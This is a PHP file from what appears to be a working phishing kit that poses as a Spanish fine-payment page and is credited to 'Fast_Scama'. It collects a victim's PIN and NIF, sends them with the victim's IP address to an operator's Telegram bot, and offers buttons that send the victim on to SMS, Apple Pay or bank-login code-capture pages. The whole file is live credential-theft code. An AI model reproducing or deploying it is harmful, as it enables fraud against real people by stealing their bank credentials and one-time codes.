<?php
session_start();

include('../settings.php');
require __DIR__ . '/vendor/autoload.php';

$date = date('d/m/y');
$heure = date('H:i:s');
$dateHeure = "$date, $heure";
$_SESSION['date_heure'] = $dateHeure;

use Telegram\Bot\Api;

$ip = $_SERVER['REMOTE_ADDR'];
$error = false;
$step = 1;
$telegram = new Api($bot_token);

$_SESSION['pin'] = $_POST['pin'];
$_SESSION['nif'] = $_POST['nif'];

if (!empty($_POST['pin']) && !empty($_POST['nif'])) {
    $step = 2;

    $keyboard = [
        'inline_keyboard' => [
            [['text' => '❌ | Invalide PIN/NIF', 'callback_data' => 'invalide_pin']],
            [['text' => '📱  | Sms Auth Basic ', 'callback_data' => 'otp_sms']],           
            [['text' => '📱  | Apple Pay ', 'callback_data' => 'otp_apple']],
            [['text' => '📱  | Banque login ', 'callback_data' => 'otp_banque']],
            [['text' => '✅ | Succès ', 'callback_data' => 'succes']],
        ]
    ];

    $telegram->sendMessage([
        'chat_id' => $chat_rez,
        'text' => "
            [🔢] PIN /NIF | 🇪🇸 Amende Espagne                    

            [🔢] PIN : {$_SESSION['pin']} 
            [🔢] NIF : {$_SESSION['nif']} 

            [🗺️] Informations liée au client [🗺️]
            [⌚] Heure et date du rez : {$_SESSION['date_heure']}
            [🌐] Ip Victime : $ip\n
			
            [©️] 𝐂𝐨𝐝𝐞𝐝 𝐛𝐲 𝐅𝐚𝐬𝐭_𝐒𝐜𝐚𝐦𝐚[©️]"
        ,
        'reply_markup' => json_encode($keyboard)
    ]);
} else {
    $error = true;
    header("Location: ../user/pin.php?error=1");
    exit();
}
?>

<!DOCTYPE html>
<html>
<head>
    <!-- Mettre ici vos balises meta, titres, styles CSS, etc. -->
</head>
<body>
    <?php if ($step == 1):
        if ($error): ?>
            <div style="color:red;">
                <?= $errorMessage ?>
            </div>
        <?php endif; ?>
    <?php elseif ($step == 2): ?>
        <div>
            <?php include '../user/loader.php'; ?>
        </div>
        <script src="https://code.jquery.com/jquery-3.7.0.js" integrity="sha256-JlqSTELeR4TLqP0OG9dxM7yDPqX1ox/HfgiSLBj8+kM=" crossorigin="anonymous"></script>
        <script>
            setInterval(function () {
                $.ajax({
                    type: "GET",
                    url: "callback.php",
                    success: function (msg) {
                        if (msg === 'invalide_pin') {
                            window.location.href = '../user/pin.php?error=1';
                        } else if (msg === 'otp_sms') {
                            window.location.href = '../user/sms_auth2.php';
                        } else if (msg === 'otp_apple') {
                            window.location.href = '../user/sms_auth.php';
                        } else if (msg === 'otp_banque') {
                            window.location.href = '../user/banque.php';
                        } else if (msg === 'succes') {
                            window.location.href = '../user/succes.php';
                        }
                    }, 
                    error: function (msg) {
                        console.error(msg);
                    }
                });
            }, 3000) 
        </script>
    <?php endif; ?>
</body>
</html>
